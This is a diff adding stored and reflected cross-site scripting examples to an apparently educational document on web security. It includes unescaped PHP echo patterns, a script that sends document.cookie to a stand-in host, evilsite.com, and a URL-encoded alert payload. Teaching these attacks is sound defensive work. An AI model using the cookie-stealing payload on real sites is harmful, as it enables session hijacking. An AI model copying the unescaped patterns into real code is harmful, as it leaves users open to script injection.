@@ -150,10 +150,34 @@ Example of Cross-Site Scripting:
 
 	* However, this is harder for hackers to attempt, because they must find a 
 	  highly trafficked site that also has a security hole that they can infiltrate. [xss-prevention]_
+
+* Another Stored XSS example would be: 
+
+	* Vulnerability: ``<div id="profile"><?php echo $user['profile']; ?></div>``
+	  This only works if the profile is pulled from a database with no escapeing 
+	  (discussed above) to protect it. The following script will show how this 
+	  vulnerability could be used to steal the user's cookies. This would allow 
+	  the hacker to impersonate the user who looked at the website. [xss-attacks]_ 
+	 
+	* Attack: 
 	
+	  ``<script>``
+			``window.open("http://evilsite.com/cookie_stealer.php?cookie=" + document.cookie, "_blank");``
+		``</script>``
+
 	
 * Reflective XSS: Similar to above, except that the user would have to click on the link 
   to activate the code. 
+  
+* Another reflectve XSS example would be: 
+
+	* Vulnerability: ``<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">`` 
+	  All the attacker needs to do in this case is get the user to click on the link 
+	  shown below, and an alert saying "XSS"(code) will pop up. 
+	
+	* Attack:
+	  Link: ``/form.php?%22%20onload%3D%22alert(%27XSS%27)%3B``
+	  Code: ``<form action="/form.php?" onload="alert('XSS');" method="post">`` 
 
 
 Sources
